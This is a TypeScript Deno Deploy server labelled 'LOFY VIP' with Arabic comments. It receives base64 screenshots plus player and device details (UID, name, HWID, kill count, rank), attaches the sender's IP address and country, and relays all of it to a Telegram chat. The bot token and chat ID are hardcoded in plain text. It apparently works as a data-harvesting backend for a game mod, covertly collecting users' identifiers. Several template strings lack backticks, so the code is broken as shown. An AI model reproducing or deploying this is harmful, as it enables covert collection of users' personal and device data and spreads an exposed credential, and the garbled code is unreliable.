// LOFY VIP — Deno Deploy Server
const BOT_TOKEN = "8465965110:AAEGm1S42Trjk9O03BZ6TJv7ansOwctwZFE";
const CHAT_ID = "8654368488";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
};

function jsonResponse(data: unknown, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { ...corsHeaders, "Content-Type": "application/json" },
  });
}

Deno.serve(async (request: Request) => {
  if (request.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  // فحص الصحة
  if (request.method !== "POST") {
    return jsonResponse({
      status: true,
      server: "LOFY VIP Online",
      chat: CHAT_ID,
      time: new Date().toISOString(),
    });
  }

  try {
    const contentType = request.headers.get("content-type") || "";
    let base64Image: string | null = null;
    let caption = "No caption";
    let deviceInfo: Record<string, string> = {};

    // ===== استقبال البيانات =====
    if (contentType.includes("application/x-www-form-urlencoded")) {
      const formText = await request.text();
      const params = new URLSearchParams(formText);

      const rawImage = params.get("base64_image") || "";
      base64Image = rawImage ? decodeURIComponent(rawImage) : "";
      caption = params.get("caption") || "No caption";
      deviceInfo = {
        uid: params.get("uid") || "غير معروف",
        name: params.get("name") || "غير معروف",
        kills: params.get("kills") || "?",
        rank: params.get("rank") || "?",
        device: params.get("device") || "غير معروف",
        hwid: params.get("hwid") || "غير معروف",
      };
    } else if (contentType.includes("application/json")) {
      const json = await request.json();
      base64Image = json.base64_image || "";
      caption = json.caption || "No caption";
      deviceInfo = json.device || {};
    }

    // ===== معلومات الشبكة =====
    const connInfo = (request as any).conn?.remoteAddr;
    const realIP =
      request.headers.get("x-forwarded-for")?.split(",")[0].trim() ||
      request.headers.get("cf-connecting-ip") ||
      (connInfo ? ${connInfo.hostname} : "unknown");

    const country = request.headers.get("cf-ipcountry") || "??";
    const userAgent = request.headers.get("User-Agent") || "";

    // ===== بناء الكابشن =====
    const finalCaption =
      ${caption}\n\n +
      ━━━━━━━━━━━━━━━\n +
      🌐 <b>IP:</b> <code>${realIP}</code>\n +
      📍 <b>الدولة:</b> ${country}\n +
      📱 <b>الجهاز:</b> ${deviceInfo.device}\n +
      🆔 <b>HWID:</b> <code>${deviceInfo.hwid}</code>\n +
      👤 <b>الاسم:</b> ${deviceInfo.name}\n +
      🔑 <b>UID:</b> <code>${deviceInfo.uid}</code>\n +
      🎯 <b>القتلات:</b> ${deviceInfo.kills}\n +
      🏆 <b>الرتبة:</b> ${deviceInfo.rank}\n +
      🕐 <b>الوقت:</b> ${new Date().toISOString()}\n +
      ━━━━━━━━━━━━━━━;

    // ===== إرسال للتيليجرام =====
    if (base64Image && base64Image.length > 100) {
      const cleanBase64 = base64Image.replace(/^data:image\/\w+;base64,/, "");

      // تحويل base64 → bytes
      let binary: Uint8Array;
      try {
        const binaryStr = atob(cleanBase64);
        binary = new Uint8Array(binaryStr.length);
        for (let i = 0; i < binaryStr.length; i++) {
          binary[i] = binaryStr.charCodeAt(i);
        }
      } catch (e) {
        return jsonResponse(
          { status: false, error: "Invalid base64: " + (e as Error).message },
          400,
        );
      }

      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("photo", new Blob([binary], { type: "image/jpeg" }), "win.jpg");
      formData.append("caption", finalCaption);
      formData.append("parse_mode", "HTML");

      const tgRes = await fetch(
        https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto,
        { method: "POST", body: formData },
      );
      const tgData = await tgRes.json();

return jsonResponse({
        status: tgData.ok,
        ip: realIP,
        telegram: tgData.ok ? "sent" : tgData.description,
      });
    }

    // ===== لو مفيش صورة =====
    const tgRes = await fetch(
      https://api.telegram.org/bot${BOT_TOKEN}/sendMessage,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: finalCaption,
          parse_mode: "HTML",
        }),
      },
    );
    const tgData = await tgRes.json();

    return jsonResponse({
      status: tgData.ok,
      ip: realIP,
      telegram: tgData.ok ? "sent" : tgData.description,
    });
  } catch (err) {
    return jsonResponse(
      { status: false, error: (err as Error).message },
      500,
    );
  }
});